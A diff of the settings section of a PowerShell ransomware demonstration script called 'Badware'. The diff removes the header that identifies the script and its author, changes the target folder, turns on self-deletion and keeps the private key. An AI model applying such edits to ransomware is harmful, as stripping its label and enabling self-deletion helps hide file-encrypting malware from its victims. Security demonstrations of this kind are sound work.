@@ -1,50 +1,17 @@
-<#
-
-__________    _____  ________     __      __  _____ _____________________                                                   
-\______   \  /  _  \ \______ \   /  \    /  \/  _  \\______   \_   _____/                                                   
- |    |  _/ /  /_\  \ |    |  \  \   \/\/   /  /_\  \|       _/|    __)_                                                    
- |    |   \/    |    \|    `   \  \        /    |    \    |   \|        \                                                   
- |______  /\____|__  /_______  /   \__/\  /\____|__  /____|_  /_______  /                                                   
-        \/         \/        \/         \/         \/       \/        \/  v3.x                                                  
-___.                ____.     .__  .__                   _____                                           __                 
-\_ |__ ___.__.     |    |__ __|  | |__| ____   ____     /     \   ____  __ __  ______________ __   _____/  |_  ____   ____  
- | __ <   |  |     |    |  |  \  | |  |/ __ \ /    \   /  \ /  \ /  _ \|  |  \/  ___/ ____/  |  \_/ __ \   __\/  _ \ /    \ 
- | \_\ \___  | /\__|    |  |  /  |_|  \  ___/|   |  \ /    Y    (  <_> )  |  /\___ < <_|  |  |  /\  ___/|  | (  <_> )   |  \
- |___  / ____| \________|____/|____/__|\___  >___|  / \____|__  /\____/|____//____  >__   |____/  \___  >__|  \____/|___|  /
-     \/\/                                  \/     \/          \/                  \/   |__|           \/                 \/ 
-
-.Synopsis
-   Badware a crypto ransomware writen in powershell 
-.DESCRIPTION
-   Badware a crypto ransomware writen in powershell for the Purpose of Customer Experience Center Demonstration 
-.EXAMPLE
-   Just launch badware.ps1
-.INPUTS
-   No Inputs 
-.OUTPUTS
-   None
-.NOTES
-    Version:        3.0 
-	Author:         Julien Mousqueton @JMousqueton 
-	Creation Date:  2023-02-21
-	Purpose/Change: new release
-.COMPONENT
-    None
-#>
 
 #---------------------------------------------------------[Initialisations]--------------------------------------------------------
 
 # Directory Target to crypt 
-$TargetEncr = "C:\RanSim"
+$TargetEncr = "C:\Users\Public\Documents\Ransome_TEST"
 
 # At the end load CPU to triggered some behavior alarm 
 $CPULoad = $false
 
 # Delete the script ransomware.ps1 
-$SelfDestroy = $false
+$SelfDestroy = $true
 
 # Delete private key after 
-$DeleteKey = $true 
+$DeleteKey = $false 
 
 # UI  
 $delay = 60  # Delay to show the UI 
